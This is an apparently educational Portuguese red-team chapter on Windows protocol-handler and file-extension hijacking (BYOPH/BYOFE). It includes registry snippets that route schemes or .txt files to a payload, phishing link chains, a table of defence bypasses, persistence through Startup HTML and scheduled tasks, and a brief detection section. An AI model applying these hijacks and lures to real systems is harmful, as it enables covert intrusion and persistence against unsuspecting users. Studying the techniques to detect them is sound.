---
title: "BYOPH & BYOFE"
---

# 08. BYOPH / BYOFE — Bring Your Own Protocol Handler / File Extension

## Extensões e Schemes Que Filtros Ignoram

Acesso inicial via arquivo suspeito (.exe, .bat, .vbs) é fortemente bloqueado por SEG (Secure Email Gateway), Mark-of-the-Web (MotW), WDAC e SmartScreen. Extensões de arquivo legítimas e URI schemes customizados **podem não ser inspecionados** com mesmo rigor, abrindo vetor de initial access que passa pelas defesas tradicionais. Follina (CVE-2022-30190) é o caso público recente — `ms-msdt://` foi handler abusado pra executar PowerShell via documento Office.

---

## Bring Your Own Protocol Handler (BYOPH)

### Conceito

Windows permite registrar **custom URI scheme** (`myapp://`, `ms-word://`, etc.) via registry. Quando usuário clica em link `myapp://payload`, Windows invoca o handler registrado.

Atacante registra URI scheme que aponta para executável controlado (ou modifica handler existente).

### Registro de Custom URI Scheme

```reg
Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\SOFTWARE\Classes\myscheme]
@="myscheme Protocol"
"URL Protocol"=""

[HKEY_CURRENT_USER\SOFTWARE\Classes\myscheme\shell\open\command]
@="\"C:\\Temp\\payload.exe\" \"%1\""
```

Após registro, link `myscheme://anything` em HTML/email abre `payload.exe` com argumento `myscheme://anything`.

**Sem admin** (HKCU). Funciona via email HTML, Slack links, browser, etc.

### Exploit Chain

1. Atacante registra handler via dropper/phishing previous-stage.
2. Enviar link `myscheme://trigger` por email/Slack.
3. Usuário clica → `payload.exe` executa.

### Existing Protocol Handlers

Alguns handlers existentes podem ser hijacked (HKCU override HKLM):

| Scheme | Handler padrão | Possível hijack? |
|--------|---------------|-----------------|
| `ms-msdt://` | MSDT (CVE-2022-30190 Follina) | Via HKCU |
| `search-ms://` | Windows Search | Potencial |
| `zoommtg://` | Zoom client | HKCU app-specific |
| `vscode://` | VS Code | HKCU override |

**Follina (CVE-2022-30190)**: usou `ms-msdt://` para executar PowerShell via documentos Office. Handler HKCU override foi parte do bypass.

---

## Bring Your Own File Extension (BYOFE)

### Conceito

Windows mapeia extensões de arquivo a programas via registry. Associação em HKCU pode **sobrescrever** HKLM para usuário específico.

Atacante registra extensão legítima (`.bat`, `.py`, `.cmd`) ou custom (`.cfg`, `.dat`) para apontar para executável controlado **como handler**.

### Registro de Custom File Extension

```reg
[HKEY_CURRENT_USER\SOFTWARE\Classes\.evilcfg]
@="EvilCFGFile"

[HKEY_CURRENT_USER\SOFTWARE\Classes\EvilCFGFile\shell\open\command]
@="\"C:\\Temp\\payload.exe\" \"%1\""
```

Arquivo `config.evilcfg` enviado via email → usuário abre → `payload.exe` executa com path do arquivo como argumento.

### Hijacking Extensão Existente

Override de `.txt` ou `.pdf` para usuário específico (stealth):

```reg
; Override .txt → nosso handler
[HKEY_CURRENT_USER\SOFTWARE\Classes\.txt]
@="EvilTextFile"

[HKEY_CURRENT_USER\SOFTWARE\Classes\EvilTextFile\shell\open\command]
@="cmd.exe /c C:\\Temp\\payload.exe & notepad.exe \"%1\""
```

Quando usuário abre qualquer `.txt`:
1. `payload.exe` executa (invisível se janela oculta).
2. `notepad.exe` abre o arquivo normalmente → usuário não nota.

**Cuidado**: override `.txt` e `.pdf` pode ser detectado por baseline de registry.

---

## Combinando BYOPH + BYOFE com Phishing

### Cadeia 1: HTML Email → Custom Scheme

1. Stage 1: documento Word macro ou exploração web → registrar `evilapp://` em HKCU.
2. Stage 2: enviar email HTML com `<a href="evilapp://trigger">Click aqui para verificar documentos</a>`.
3. Usuário clica → stage 2 executa.

### Cadeia 2: Custom Extension em Anexo

1. Criar arquivo `report.cfg` que parece inocente.
2. Registrar `.cfg` → handler em HKCU via outro vetor.
3. Enviar `report.cfg` — não tem MotW se enviado via mecanismos internos (SharePoint, Teams).
4. Usuário abre → payload.

### Bypasses de Defesa

| Defesa | Bypass |
|--------|--------|
| Mark-of-the-Web (MotW) | Usar ISO/ZIP (até Win 11 22H2), SharePoint interno, Teams |
| SmartScreen | Extensão não-comum = sem SmartScreen DB entry |
| WDAC | Handler registrado como user-space app sem assinatura não passa em WDAC publisher policy |
| Email filtering | `.cfg`, `.dat`, `.ini` geralmente não filtrados |

---

## Persistence via Protocol Handler

Handler registrado = persistência ao nível de usuário. Cada vez que link `evilscheme://...` é enviado, handler executa.

Combinar com HTML arquivo local:

```html
<!-- autorun.html salvo em pasta de Startup -->
<meta http-equiv="refresh" content="0; url=evilscheme://persist">
```

Ou via task scheduler chamando URL:

```xml
<Exec>
  <Command>C:\Windows\System32\cmd.exe</Command>
  <Arguments>/c start evilscheme://trigger</Arguments>
</Exec>
```

---

## Detecção

- **Registry monitoring**: criação de `HKCU\SOFTWARE\Classes\<scheme>\shell\open\command` por processo não-esperado → alert.
- **Sysmon Event 13**: registry key create/modify em Classes.
- **Process creation**: processo lançado por `explorer.exe` com argumento de URI scheme = context suspeito.
- **Baseline**: EDR com hardening pode monitorar user-defined protocol handlers via WMI event subscription.

## Leitura Complementar

- Follina (CVE-2022-30190) — @domchell write-up
- ired.team — Offensive Security / Initial Access
- MITRE ATT&CK T1546.001 — Change Default File Association
- MITRE ATT&CK T1546 — Event Triggered Execution
